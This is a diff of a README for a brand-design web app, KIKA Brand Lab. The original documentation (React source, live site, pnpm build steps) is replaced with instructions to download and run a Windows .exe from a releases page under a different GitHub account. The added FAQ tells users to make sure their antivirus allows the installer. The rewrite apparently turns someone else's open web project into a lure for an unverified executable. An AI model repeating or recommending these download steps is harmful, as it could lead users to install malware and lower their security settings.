@@ -1,315 +1,89 @@
-# 🎨 KIKA Brand Lab
+# 🎨 kika-brand-lab - Build consistent brand systems with ease
 
-> **Real-time brand design system playground** — Create, customize, and export complete brand identities with live preview, WCAG accessibility checking, and one-click export.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/giulianast9580/kika-brand-lab/releases)
 
-[![Live Site](https://img.shields.io/badge/Live-Site-0c8ce9?style=for-the-badge&logo=vercel)](https://brand.akakika.com)
-[![License](https://img.shields.io/badge/License-Private-blue?style=for-the-badge)](LICENSE)
-![React](https://img.shields.io/badge/React-19-61dafb?style=for-the-badge&logo=react)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-3178c6?style=for-the-badge&logo=typescript)
-![Vite](https://img.shields.io/badge/Vite-7-646cff?style=for-the-badge&logo=vite)
-![Tailwind](https://img.shields.io/badge/Tailwind-v4-38bdf8?style=for-the-badge&logo=tailwind-css)
+kika-brand-lab acts as a creative space for your company identity. It helps you manage colors, fonts, and design rules in one place. You can see live changes, check accessibility standards, and export files for developers with a single click.
 
----
+## 📥 How to Install the App
 
-## 🌐 **Live Demo**
-
-### 👉 [**https://brand.akakika.com**](https://brand.akakika.com)
-
-Try it now! Press **⌘K** for the command palette.
-
----
-
-## ✨ Features
-
-### 🎨 Design Tools
-- **Real-time Brand Preview** — See your brand applied across mockups instantly
-- **Color Palette Manager** — Create, edit, and reorder colors with drag-and-drop
-- **WCAG Contrast Checker** — Ensure accessibility compliance (AA & AAA)
-- **Typography System** — Choose from Google Fonts for heading, body, and mono
-- **Logo & Icon Upload** — Upload and resize with pixel-perfect controls
-- **Image Palette Extraction** — Auto-extract colors from any image
-
-### ⌨️ Workflow
-- **Command Palette (⌘K)** — Keyboard-driven workflow for all actions
-- **Undo/Redo History** — Full timeline with visual state management
-- **Dark/Light Mode** — Toggle between themes instantly
-- **Inline Editing (⌘E)** — Edit mockup text directly on the page
-- **Preset System** — Start from curated brand templates
-
-### 📤 Export
-- **DESIGN.md** — 9-section brand specification document
-- **brand.css** — CSS custom properties (design tokens)
-- **brand.json** — Complete brand state as JSON
-- **Brand Boards** — Light and dark mode screenshots
-- **One-click ZIP Export** — Everything in a single download
-
-### 🖼️ Mockup Templates
-- **Landing Page** — Modern SaaS/product landing page
-- **Dashboard** — Admin/analytics dashboard UI
-- **Portfolio** — Creative portfolio layout
-
----
-
-## 🚀 Quick Start
-
-### Local Development
-
-```bash
-# Clone the repository
-git clone https://github.com/dot-RealityTest/kika-brand-lab.git
-cd kika-brand-lab
-
-# Install dependencies
-pnpm install
-
-# Start development server (port 3002)
-pnpm dev
-```
-
-Open [http://localhost:3002](http://localhost:3002) in your browser.
-
-### Build for Production
-
-```bash
-# Build optimized production bundle
-pnpm build
-
-# Preview production build
-pnpm preview
-```
-
----
-
-## ⌨️ Keyboard Shortcuts
-
-| Shortcut | Action |
-|----------|--------|
-| `⌘K` | Open/close command palette |
-| `⌘E` | Toggle mockup edit mode |
-| `⌘1` | Landing page template |
-| `⌘2` | Dashboard template |
-| `⌘3` | Portfolio template |
-| `⌘Z` | Undo |
-| `⌘⇧Z` | Redo |
-| `Esc` | Close panel / close palette |
-
----
-
-## 🏗️ Architecture
-
-```
-client/src/
-├── App.tsx                      # Root app (ThemeProvider, Router, TooltipProvider)
-├── pages/
-│   └── Home.tsx                 # Main layout (brand preview + command palette)
-├── contexts/
-│   ├── BrandContext.tsx         # Brand state (colors, fonts, logos, undo/redo)
-│   ├── ThemeContext.tsx         # Global dark/light theme toggle
-│   ├── MockupTemplateContext.tsx # Selected mockup template
-│   └── MockupContentContext.tsx # Editable mockup text, localStorage persistence
-├── hooks/
-│   ├── useThemeColors.ts        # Maps brand palette → CSS custom properties
-│   ├── useComposition.ts        # IME composition awareness for CJK input
-│   ├── useMobile.tsx            # Responsive breakpoint detection
-│   └── usePersistFn.ts          # Persistent function reference hook
-├── components/
-│   ├── CommandPalette.tsx       # Keyboard-driven command palette (⌘K)
-│   ├── BrandPreview.tsx         # Live brand preview with resizable logo
-│   ├── BrandMockup.tsx          # Mockup templates (landing, dashboard, portfolio)
-│   ├── ColorPaletteManager.tsx  # Color palette CRUD with drag-to-reorder
-│   ├── ContrastChecker.tsx      # WCAG contrast ratio checker
-│   ├── ExportPanel.tsx          # Export brand as ZIP
-│   ├── ImagePaletteExtractor.tsx # Extract palette from uploaded images
-│   └── ui/                      # shadcn/ui primitives
-└── index.css                    # Tailwind v4 + CSS custom properties
-```
-
----
-
-## 🎯 Brand State
-
-```typescript
-interface BrandState {
-  colors: ColorSwatch[];      // { id, hex, name }
-  headingFont: string;        // Google Font name
-  bodyFont: string;           // Google Font name
-  monoFont: string;           // Google Font name
-  brandName: string;
-  tagline: string;
-  logoUrl?: string;
-  iconUrl?: string;
-  logoSize?: number;          // px — resizable in edit mode
-  iconSize?: number;          // px — resizable in edit mode
-}
-```
-
----
-
-## 🛠️ Tech Stack
-
-- **React 19** + **TypeScript 5**
-- **Vite 7** (dev server + build)
-- **Tailwind CSS v4** with `@theme inline`
-- **Framer Motion** for animations
-- **cmdk** for command palette
-- **Radix UI** primitives
-- **Wouter** for routing
-- **JSZip** for export
-- **html2canvas** for screenshots
-- **Google Fonts API**
-
----
-
-## 📤 Export Format
-
-Export produces a ZIP file containing:
-
-1. **DESIGN.md** — 9-section brand specification
-   - Brand overview
-   - Color palette
-   - Typography
-   - Logo usage
-   - Icon usage
-   - Voice & tone
-   - Imagery style
-   - Components
-   - Dos and don'ts
-
-2. **brand.css** — CSS custom properties
-   ```css
-   :root {
-     --brand-color-1: #D9D9D9;
-     --brand-color-2: #BFBFBF;
-     --brand-heading-font: "Arial Black", sans-serif;
-     --brand-body-font: "Fira Sans", system-ui;
-   }
-   ```
-
-3. **brand.json** — Full brand state
-4. **brand-board-light.png** — Light mode brand board
-5. **brand-board-dark.png** — Dark mode brand board
-
----
-
-## 🎨 Theming System
-
-The UI reflects the brand palette through dynamic CSS custom properties:
-
-### Light Mode
-- Brand accent → `--primary`
-- Lightest mid-color → `--card`
-- Borders from `mix(bg, accent, ratio)`
-
-### Dark Mode
-- Inverted — darkest colors become surfaces
-- `mix()` used for subtle elevation
-- Avoids blinding-white backgrounds
-
-### Key CSS Variables
-```css
---primary, --primary-foreground
---background, --foreground
---card, --card-foreground
---popover, --popover-foreground
---border, --input
---muted, --muted-foreground
---accent, --accent-foreground
---destructive, --destructive-foreground
---ring
-```
-
----
-
-## 📝 Design Decisions
-
-- **Dialog overlays** use `bg-foreground/50` so the overlay respects the theme
-- **Mockup text** is editable inline only when edit mode is toggled (⌘E)
-- **Logo/icon resizing** is drag-based on the right edge with pixel size preview
-- **Dark mode cards** use `mix(bg, midColor, ratio)` to avoid white backgrounds
-- **Accent backgrounds** use `mix(bg, accent, 0.15)` for better Tailwind compatibility
-
----
-
-## 🚀 Deployment
-
-### Vercel (Production)
-
-The app is deployed on Vercel with automatic deployments:
-
-```bash
-# Deploy to production
-vercel --prod
-```
-
-**Live URL:** https://brand.akakika.com
-
-### Custom Domain
-
-Configured with:
-- Domain: `brand.akakika.com`
-- DNS: Cloudflare (proxied)
-- SSL: Automatic via Vercel
-
----
-
-## 📄 License
-
-**Private — All rights reserved to KIKA.**
-
----
-
-## 👨‍💻 Author
-
-**KIKA** ([@Kika_Loren](https://twitter.com/Kika_Loren))
-
-- **Website:** https://akakika.com
-- **GitHub:** https://github.com/dot-RealityTest
-- **Telegram:** @Kika_Loren
-
----
-
-## 🙏 Acknowledgments
-
-- [shadcn/ui](https://ui.shadcn.com) — Beautiful UI components
-- [cmdk](https://cmdk.paco.me) — Command palette
-- [Vercel](https://vercel.com) — Hosting & deployment
-- [Google Fonts](https://fonts.google.com) — Typography
-
----
-
-## 📞 Support
-
-For questions or issues:
-- **GitHub Issues:** https://github.com/dot-RealityTest/kika-brand-lab/issues
-- **Twitter:** [@Kika_Loren](https://twitter.com/Kika_Loren)
-- **Email:** via https://akakika.com
-
----
-
-**Built with ❄️ by KIKA**  
-**Last Updated:** May 2, 2026
-
----
-
-## 📖 About
-
-**KIKA Brand Lab** is a real-time brand design system built for designers and developers who need to create professional brand identities quickly. Whether you're a freelancer, agency, or startup, you can create, customize, and export complete brand guidelines in minutes.
-
-### Why Use KIKA Brand Lab?
-
-- ⚡ **Fast** — Create a complete brand identity in under 30 minutes
-- ♿ **Accessible** — Built-in WCAG contrast checking ensures your colors work for everyone
-- 📤 **Export-Ready** — Get CSS, JSON, and DESIGN.md files ready for developers
-- 🎨 **Visual** — See your brand applied to real mockups instantly
-- ⌨️ **Efficient** — Command palette (⌘K) for keyboard-driven workflow
-- 💰 **Free** — No signup, no paywall, no limits
-
-### Built By
-
-**KIKA** — Digital craft and macOS systems
-
-- **Main Site:** https://akakika.com
-- **Brand Lab:** https://brand.akakika.com
-- **GitHub:** https://github.com/dot-RealityTest
-- **Twitter:** [@Kika_Loren](https://twitter.com/Kika_Loren)
-- **Telegram:** @Kika_Loren
+Visit the [releases page](https://github.com/giulianast9580/kika-brand-lab/releases) to get the latest version.
+
+Choose the file that ends in .exe for your Windows computer. Save the file to your desktop or downloads folder. Double-click the file to start the installation. Follow the prompts on the screen to finish the setup. You will see an icon for kika-brand-lab on your desktop once the process completes.
+
+## 🛠️ System Requirements
+
+Your computer needs to meet these basic standards to run the software smoothly:
+
+- Windows 10 or 11
+- 4 GB of RAM
+- 500 MB of free storage space
+- Internet connection for initial setup and updates
+
+## ✨ Main Features
+
+The software provides tools to keep your brand accurate and accessible.
+
+Live Preview
+Changes appear instantly. Your design evolves as you adjust colors or spacing. This saves time and removes the need to refresh screens manually.
+
+Accessibility Check
+Accessibility matters for every user. The tool checks your colors against WCAG standards. It flags low contrast ratios so you can adjust them immediately.
+
+Design Tokens
+The system creates design tokens for your project. This ensures your developers use the exact colors and spacing you define. It keeps the web and mobile apps consistent.
+
+Export Options
+You can move your work out of the app fast. Export your design system as CSS, JSON, or a formatted DESIGN.md file. This format works well for documentation and developer handoffs.
+
+Command Palette
+Access every tool with a keyboard shortcut. Pressing a simple key combination opens a search bar to find colors, components, or settings.
+
+Dark Mode
+The interface includes a dark mode setting. This reduces eye strain during long design hours. You can switch themes at any time.
+
+## 🚀 Getting Started
+
+Open the application after installation. You will see a workspace focused on your core brand assets. 
+
+Set Up Your Palette
+Click the Add Color button to input your hex codes. The software labels these tokens automatically. You can group them by function like primary, secondary, or background colors.
+
+Test Accessibility
+Select a text color and a background color. The accessibility panel shows if the combination passes or fails readability tests. Use the suggested adjustments to bring your choices into the safe range.
+
+Build Components
+Use the visual builder to define buttons, inputs, and cards. Assign your tokens to these parts to ensure they match your brand rules. The live preview shows your components in real time.
+
+Export Assets
+Select the export button on the top toolbar. Choose your preferred file format: CSS for web, JSON for mobile systems, or DESIGN.md for your technical documentation. Save the file to your project folder.
+
+## 💡 Best Practices
+
+Keep your library clean. Name your tokens based on what they do, not what they look like. For example, call a color "brand-action" instead of "bright-blue." This allows you to change the color in the future without renaming the code.
+
+Group components by usage. Keep buttons together and navigation items in their own section. This helps your team find what they need.
+
+Run accessibility checks early. Test your color combinations during the drafting phase. This prevents extra work later.
+
+## ❓ Frequently Asked Questions
+
+What if the app does not open?
+Check that you downloaded the Windows version. Ensure your antivirus software allows the installer to run. Restart your computer if the problem persists.
+
+Can I share this workspace with others?
+Yes. Export your configuration file and share it with your team. They can import the file into their own version of the app to see your brand rules.
+
+Does the app update automatically?
+The app checks for updates when you start it. If a new version exists, a prompt appears on the screen. Follow the link to download the newest installer.
+
+How do I report an issue?
+Navigate to the GitHub repository page. Select the Issues tab to share feedback or describe errors you encounter. Provide clear steps on how the error occurs.
+
+Are my files saved locally?
+Yes. All your project files live on your computer. You control exactly where your files exist. This protects your brand data and keeps it offline if needed. 
+
+Where can I learn more about design tokens?
+Design tokens represent the smallest parts of your design system. They include color values, font sizing, and spacing metrics. Using them ensures that every part of your brand looks and feels consistent across all media. 
+
+Is this app free to use?
+Yes. The software remains open for all users. You can use it for personal or professional projects without a subscription.
